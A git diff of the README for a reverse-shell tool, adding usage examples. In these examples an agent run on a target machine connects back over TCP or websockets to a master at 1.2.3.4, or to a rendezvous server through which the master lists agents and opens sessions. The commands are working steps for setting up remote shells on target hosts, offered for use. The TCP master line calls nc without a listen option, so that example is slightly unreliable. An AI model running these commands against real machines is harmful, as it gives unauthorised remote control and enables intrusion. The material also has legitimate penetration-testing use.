@@ -39,7 +39,42 @@ $ git clone https://github.com/maxlaverse/reverse-shell
 $ cd reverse-shell && make
 ```
 
-## Usage
+## Example of usage
+Direct, with TCP:
+```bash
+# On the master (1.2.3.4)
+$ nc 1.2.3.4 7777
+
+# On the target
+$ reverse-shell-agent tcp --host=1.2.3.4 --port=7777
+```
+
+Direct with Websockets:
+```bash
+# On the master (1.2.3.4)
+$ reverse-shell-master listen --port=7777
+
+# On the target
+$ reverse-shell-agent websocket --url=http://1.2.3.4:7777
+```
+
+With a rendezvous:
+```bash
+# On the rendezvous (1.2.3.4)
+$  reverse-shell-rendezvous --port=7777
+
+# On the target
+$ reverse-shell-agent websocket --url=http://1.2.3.4:7777
+
+# On the master
+$ reverse-shell-master rendezvous list-agents --url=http://1.2.3.4:7777
+List of agents:
+* 3.4.5.6:65000
+
+# Create a session
+$ reverse-shell-master rendezvous create-session --url=http://1.2.3.4:7777 3.4.5.6:65000
+```
+
 The complete usage is available for each component:
 - [agent](docs/agent/reverse-shell-agent.md)
 - [master](docs/master/reverse-shell-master.md)
